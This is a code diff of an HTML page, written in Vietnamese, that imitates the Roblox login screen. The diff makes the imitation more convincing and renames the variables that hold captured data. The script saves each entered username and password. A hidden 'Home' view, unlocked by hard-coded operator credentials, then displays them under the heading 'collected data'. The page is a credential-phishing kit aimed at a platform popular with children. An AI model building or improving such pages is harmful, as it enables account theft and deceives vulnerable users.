@@ -2,63 +2,67 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Interface</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; margin: 0; }
-        #nav { font-size: 10px; padding: 5px; border-bottom: 1px solid #333; display: none; }
-        #loginForm { padding: 20px; text-align: center; }
-        input { background: #222; border: 1px solid #444; color: white; padding: 8px; width: 80%; margin: 5px; }
-        button { padding: 8px 20px; background: #0084ff; border: none; color: white; cursor: pointer; }
-        #homeArea { display: none; padding: 20px; }
-        #vid { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        #nav { position: absolute; top: 15px; left: 15px; font-size: 14px; cursor: pointer; color: #aaa; display: none; border: 1px solid #333; padding: 5px 10px; }
+        .container { width: 90%; max-width: 360px; text-align: center; }
+        .logo { font-size: 36px; font-weight: bold; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; background: #222; color: #fff; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
+        .btn-main { background: #0084ff; color: white; }
+        .btn-fast { background: transparent; border: 2px solid #fff; color: white; }
+        #homeArea { display: none; }
+        #videoOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
     </style>
 </head>
 <body>
 
-<div id="nav"><a href="#" onclick="viewHome()" style="color:#fff; text-decoration:none;">Home</a></div>
+<div id="nav" onclick="showHome()">Home</div>
 
-<div id="loginForm">
-    <h2>ROBLOX</h2>
-    <input type="text" id="user" placeholder="Tên đăng nhập"><br>
-    <input type="password" id="pass" placeholder="Mật khẩu"><br>
-    <button onclick="login()">Đăng nhập</button>
+<div class="container" id="loginForm">
+    <div class="logo">ROBLOX</div>
+    <input type="text" id="user" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
+    <input type="password" id="pass" placeholder="Mật khẩu">
+    <button class="btn-main" onclick="executeLogin()">Đăng nhập</button>
+    <button class="btn-fast">Đăng Nhập Nhanh</button>
 </div>
 
-<div id="homeArea">
+<div id="homeArea" class="container">
     <h3>Dữ liệu đã thu thập:</h3>
-    <div id="result"></div>
+    <p id="dataLog"></p>
 </div>
 
-<video id="vid" loop>
-    <source src="video_url.mp4" type="video/mp4">
-</video>
+<div id="videoOverlay">
+    <video id="vid" width="100%" height="100%" loop autoplay>
+        <source src="video.mp4" type="video/mp4">
+    </video>
+</div>
 
 <script>
-    function login() {
+    function executeLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         
-        // Lưu dữ liệu vào localStorage (Giả lập thu thập)
-        localStorage.setItem('captured_user', u);
-        localStorage.setItem('captured_pass', p);
+        localStorage.setItem('u', u);
+        localStorage.setItem('p', p);
         
-        // Kích hoạt video
         const v = document.getElementById('vid');
-        v.style.display = 'block';
+        document.getElementById('videoOverlay').style.display = 'block';
         v.volume = 1.0;
         v.play();
 
-        // Kiểm tra điều kiện mở khóa Home
-        if(u === "ggg36" && p === "36thanhhoa") {
+        if(u === "gg3636" && p === "36thanhhoa") {
             document.getElementById('nav').style.display = 'block';
         }
     }
 
-    function viewHome() {
+    function showHome() {
         document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('vid').style.display = 'none';
+        document.getElementById('videoOverlay').style.display = 'none';
         document.getElementById('homeArea').style.display = 'block';
-        document.getElementById('result').innerText = "User: " + localStorage.getItem('captured_user') + 
-                                                      " | Pass: " + localStorage.getItem('captured_pass');
+        document.getElementById('dataLog').innerText = "User: " + localStorage.getItem('u') + " | Pass: " + localStorage.getItem('p');
     }
 </script>
 </body>
